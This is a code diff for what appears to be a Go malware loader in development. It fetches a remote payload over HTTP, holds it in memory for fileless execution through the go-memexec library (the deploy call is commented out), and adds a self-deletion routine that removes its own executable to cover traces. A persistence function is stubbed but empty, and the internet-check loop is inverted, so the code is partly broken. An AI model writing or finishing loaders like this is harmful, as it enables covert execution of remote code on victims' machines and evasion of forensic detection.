@@ -4,10 +4,10 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"os"
 	"time"
 
 	"github.com/amenzhinsky/go-memexec"
-	"golang.org/x/sys/windows"
 )
 
 const (
@@ -15,20 +15,23 @@ const (
 )
 
 var (
-	PAYLOAD = ""
+	PAYLOAD []byte
 )
 
 func main() {
 	fmt.Println("Hello friend")
 	persist()
-	for !has_internet_access() {
+	for has_internet_access() {
 		time.Sleep(time.Minute)
 	}
 	fetch_payload()
+	// go deploy(PAYLOAD)
+	// time.Sleep(30*time.Second)
+	clean_up()
 }
 
 func persist() {
-
+	
 }
 
 func has_internet_access() bool {
@@ -43,13 +46,16 @@ func fetch_payload() {
 	body := resp.Body
 	bytes, _ := io.ReadAll(body)
 	fmt.Println(string(bytes))
+	PAYLOAD = bytes
 }
 
 func deploy(path string) {
-	exe, _ := memexec.New([]byte(PAYLOAD))
+	exe, _ := memexec.New(PAYLOAD)
 	exe.Command().Run()
 }
 
 func clean_up() {
-	
+	path, _ := os.Executable()
+	fmt.Println(path)
+	os.Remove(path)
 }
